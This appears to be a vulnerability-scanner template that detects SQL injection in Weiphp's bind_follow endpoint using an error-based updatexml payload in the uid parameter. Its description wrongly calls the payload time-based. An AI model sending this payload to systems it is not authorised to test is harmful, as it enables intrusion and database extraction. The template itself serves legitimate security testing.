id: poc-yaml-weiphp-sql
info:
  name: Weiphp SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template tests for SQL injection in the Weiphp application by leveraging a time-based SQL payload.
variables:
  rand: '{{rand_int(10000, 21000)}}'
http:
  - method: GET
    path:
      - '{{BaseURL}}/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1)--+'
    redirects: false
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - '~[a-f0-9]{32}~'
        part: body
      - type: dsl
        dsl:
          - contains(body, substr(md5(rand), 0, 31))
